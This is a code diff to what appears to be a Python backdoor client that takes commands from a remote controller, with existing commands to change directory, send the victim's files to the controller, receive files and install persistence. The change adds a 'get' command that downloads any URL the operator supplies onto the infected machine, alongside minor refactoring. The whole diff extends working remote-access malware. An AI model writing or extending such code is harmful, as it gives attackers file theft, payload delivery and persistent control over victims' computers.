@@ -6,7 +6,7 @@ import time
 import os
 import shutil
 import sys
-
+import requests
 
 def client():
     global s
@@ -28,16 +28,18 @@ def shell():
         if cmd == "exit":
             reliable_send("exiting...")
             break
-        elif cmd[:2] == "cd" and len(cmd) > 1:
+        elif cmd.startswith("cd") and len(cmd) > 1:
             try:
                 os.chdir(cmd[3:])
             except:
                 continue
-        elif cmd[:8] == "download":
+        elif cmd.startswith("download"):
             download(cmd)
-        elif cmd[:6] == "upload":
+        elif cmd.startswith("upload"):
             upload(cmd)
-        elif cmd[:11] == "persistence":
+        elif cmd.startswith("get"):
+            download_remote(cmd)
+        elif cmd.startswith("persistence"):
             persistence()
         else:
             try:
@@ -63,9 +65,25 @@ def reliable_recv():
             continue
 
 
+def download_remote(cmd):
+    """
+    Download a remote file
+    :param cmd:
+    """
+    try:
+        url = cmd[4:]
+        file_name = url.split("/")[-1]
+        response = requests.get(url)
+        with open(file_name, "wb") as out_file:
+            out_file.write(response.content)
+            reliable_send("Download completed")
+    except:
+        reliable_send("Download failed")
+
+
 def download(cmd):
     """
-    Send a file to host
+    Send the file to the host
     :param cmd:
     :return:
     """
@@ -79,7 +97,7 @@ def download(cmd):
 
 def upload(cmd):
     """
-    Receive a file from host
+    Receive a file from the host
     :param cmd:
     :return:
     """
